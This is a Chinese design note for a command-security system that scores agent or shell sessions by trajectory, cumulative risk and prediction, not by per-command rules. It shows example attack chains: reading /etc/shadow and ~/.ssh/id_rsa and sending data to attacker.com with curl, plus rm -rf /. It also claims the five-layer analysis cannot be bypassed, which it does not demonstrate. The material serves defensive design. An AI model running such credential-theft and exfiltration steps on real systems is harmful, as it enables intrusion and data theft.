# 安全哲学 v2 — 从"分类"到"轨迹"

## 范式转换

```
v1 (当前):               v2 (需要):
────────────              ────────────
本质主义                 关系主义
"这个操作有害吗？"        "这个操作在这个轨迹中有害吗？"
静态分类                 动态画像
二值决策                 连续风险评估
无状态                   有状态轨迹
检测                     预测
单层判断                 多层协同
固定阈值                 自适应阈值
```

## 1. 从本质主义到关系主义

```
本质主义:  rm -rf / 本质上是危险的 → 永远阻止
关系主义:  rm -rf / 在恢复演练中是安全的，在正常运维中是危险的

安全不是操作的固有属性，而是操作与上下文的关系。
```

### 例子

```
cat /etc/shadow
├── 来自 root 在凌晨 3 点的备份脚本 → 正常运维 ✅
├── 来自 www-data 在正常业务时间 → 横向移动 ⚠️
└── 紧跟 curl 外传命令 → 数据泄露 🚨

同一个操作，三种上下文，三种判断。
```

## 2. 从分类到轨迹

```
分类思维:
  输入 → [是否有害？] → 允许/阻止
  每次决策独立，不考虑历史

轨迹思维:
  步骤1: ls ~/.ssh/              → 可疑（开始探索）
  步骤2: cat ~/.ssh/id_rsa       → 高危（凭证访问）
  步骤3: curl http://attacker.com → 攻击确认
                              ↓
  在步骤2就可以阻止，因为步骤1的轨迹已预示步骤2。
```

### 轨迹的核心洞察

```
一次操作的安全性 = f(操作本身, 前序轨迹, 预测后续)
                       ↓          ↓          ↓
                   策略匹配    序列相似度    攻击链预测
                   固定权重    动态权重     概率权重
```

## 3. 从检测到预测

```
检测:  等待攻击完成再告警
预测:  在攻击完成前阻止

预测的依据:
  当前轨迹与已知攻击链的前缀的相似度。
  
  如果:
    步骤1 → [0.1, 0.2, 0.8]  ← embedding
    步骤2 → [0.1, 0.3, 0.7]  ← embedding
  匹配:
    已知攻击链前缀 → [0.1, 0.2, 0.8], [0.1, 0.3, 0.7]
    预测下一步     → [0.9, 0.1, 0.2]  ← curl exfil
  
  在步骤3发生前，预测到它、提前阻止。
```

## 4. 从独立判断到累积风险

```
步骤1 → 风险 +0.1 (低)
步骤2 → 风险 +0.2 (中)  ← 累积 0.3
步骤3 → 风险 +0.4 (高)  ← 累积 0.7 → 触发降级

不是每个步骤单独判断是否安全。
而是每个步骤对累积风险的贡献率。

安全边界不是一条线，而是一个渐变区域:
  [0.0────0.3────0.5────0.7────1.0]
  安全    观察    降级    锁定   拦截
```

## 5. 从固定阈值到自适应阈值

```
固定阈值的问题:
  低阈值 → 误杀多（拦截 lb -la）
  高阈值 → 漏过多（放过 rm -rf）

自适应阈值:
  会话初期 → 阈值高（给用户空间）
  出现异常 → 阈值降低（更敏感）
  风险快速上升 → 阈值骤降（提前拦截）
  累积风险高 → 阈值归零（锁定会话）
```

## 6. 综合哲学：安全是涌现属性

```
安全不是任何单层的属性。
安全是三层（向量、数据、隐私）在时间维度上交互的涌现属性。

  向量层: "这个 embedding 看起来像什么？"
  数据层: "这个操作有权限吗？"
  隐私层: "数据去了哪里？"
  轨迹层: "这个序列已知的攻击链匹配吗？"
  预测层: "下一步最可能是什么？"
                   ↓
  安全 = 五层在时间轴上的联合涌现
  
  任何单层都可以被骗过，但五层联合的时间序列分析不可绕过。
```

## 7. 与自增长的关系

```
每一层产生信号 → 信号汇聚 → 决策 → 结果反馈 → 更新模型

自增长不是简单地添加新规则。
而是:
  1. 发现新攻击模式 → 提取该模式的轨迹特征
  2. 注册到轨迹匹配器 → 下次遇到类似轨迹可预测
  3. 更新各层权重 → 降低漏过的层的权重，提高拦截的层的权重
  4. 重新调参 → 整体阈值随新数据漂移
```

## 总结

```
v1 安全:  输入 → 过滤器 → 输出
          过滤器是静态的，攻击者可以研究并绕过

v2 安全:  会话 → 轨迹 → 预测 → 累积风险 → 自适应决策
          攻击者无法研究轨迹，因为轨迹不是预设的
          攻击者无法绕过时间，因为时间不可逆
```
